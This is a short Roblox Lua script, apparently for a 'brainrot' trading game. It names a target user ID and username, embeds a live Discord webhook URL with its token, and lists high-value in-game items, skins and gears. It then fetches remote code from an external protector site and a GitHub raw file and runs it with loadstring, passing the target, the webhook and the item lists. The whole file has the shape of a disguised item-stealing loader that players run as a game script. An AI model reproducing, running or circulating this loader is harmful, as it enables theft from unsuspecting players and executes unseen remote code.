local TARGET_ID = 9450956082
local TARGET_USER = "TheVenom298"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1565754288209403966/7GyJdb8jSP7ifsoVKhboEggqItkLwKXOO95W0ASwcuAAnhLo6asfI1pyudmegWeiFMkd"

local TargetBrainrots = {
    ["Dragon Skeletonini"] = true,
    ["Phoenix"] = true,
    ["Plant Bros"] = true,
    ["Hydra Serpent"] = true,
    ["Orchidox"] = true,
    ["Strawberry Elephant"] = true,
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["Los Dragons"] = true,
    ["La Craft Machine"] = true,
    ["Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true,
    ["Griffin"] = true,
    ["Gold and Diamond"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Antonio"] = true,
    ["Hydra Bunny"] = true,
    ["John Pork"] = true,
    ["Elefanto Frigo"] = true,
    ["Rubrikiko"] = true,
    ["Pancake and Syrup"] = true,
    ["Arcadragon"] = true,
    ["Rico Dinero"] = true,
    ["Kalika Bros"] = true,
    ["Capitano Americano"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Globa Steppa"] = true,
    ["Dragon Aquanini"] = true,
    ["Dug Dug Dug"] = true,
    ["Headless Horseman"] = true,
    ["La Supreme Combinasion"] = true,
    ["La Casa Boo"] = true,
    ["Signore Carapace"] = true,
    ["Fishino Clownino"] = true,
    ["Duggy Bros"] = true,
    ["Cerberus"] = true,
    ["Kraken"] = true,
    ["Venuspino"] = true,
    ["Steakini Fattini"] = true,
    ["Caylusaurus"] = true,
    ["Sammyni Cakini"] = true,
    ["Rhino Helicopterino"] = true,
    ["Los Hackers"] = true,
    ["Foxini Lanternini"] = true,
    ["Jelly Moby"] = true,
    ["Digi Narwhal"] = true,
    ["Moby Bros"] = true,
    ["Los Admins"] = true,
    ["Bunny and Eggy"] = true,
    ["Boppin Bunny"] = true,
    ["Burguro and Fryuro"] = true,
    ["Capitano Moby"] = true,
    ["Cash or Card"] = true,
    ["Celestial Pegasus"] = true,
    ["Cooki and Milki"] = true,
    ["Cloverat Clapat"] = true,
    ["Fortunu and Cashuru"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Festive 67"] = true,
    ["Garama and Madundung"] = true,
    ["Fragola La La La"] = true,
    ["Ginger Gerat"] = true,
    ["Guest 666"] = true,
    ["Hopilikalika Hopilikalako"] = true,
    ["Jolly Jolly Sahur"] = true,
    ["Ketupat Bros"] = true,
    ["La Food Combinasion"] = true,
    ["La Secret Combinasion"] = true,
    ["Los Secret Combinasionas"] = true,
    ["Pizza and Ranch"] = true,
    ["Examen Bros"] = true,
    ["Yetimatic"] = true,
    ["Bumbatron"] = true,
    ["Queen Bee"] = true,
    ["S'more Serat"] = true,
    ["Los Amigos"] = true,
    ["La Breakfast Combinasion"] = true,
    ["Los Sekolahs"] = true,
    ["Love Love Bear"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Quackini Snackini"] = true,
    ["Reinito Sleighito"] = true,
    ["Rosey and Teddy"] = true,
    ["Sammyni Fattini"] = true,
    ["Spooky and Pumpky"] = true,
    ["Rubiko and Kubiko"] = true,
    ["La Fuse Machine"] = true,
    ["Polaroidini"] = true,
    ["Sammyni Truckini"] = true,
    ["Chicli Chicla"] = true
}

local TargetBaseSkins = {
    ["Yin Yang"] = true,
    ["Tralalero"] = true,
    ["Rainbow"] = true,
    ["Octo"] = true,
    ["Galaxy"] = true,
    ["Diamond"] = true,
    ["Divine"] = true,
    ["Cyber"] = true,
    ["Cursed"] = true,
    ["Radioactive"] = true
}

local TargetGears = {
    ["Bloodmoon Hammer"] = true,
    ["Cupid's Wings"] = true,
    ["Santa's Sleigh"] = true,
    ["Waverider"] = true,
    ["Witch's Broom"] = true
}

task.spawn(function()
    



loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=1mktygib"))()




    task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)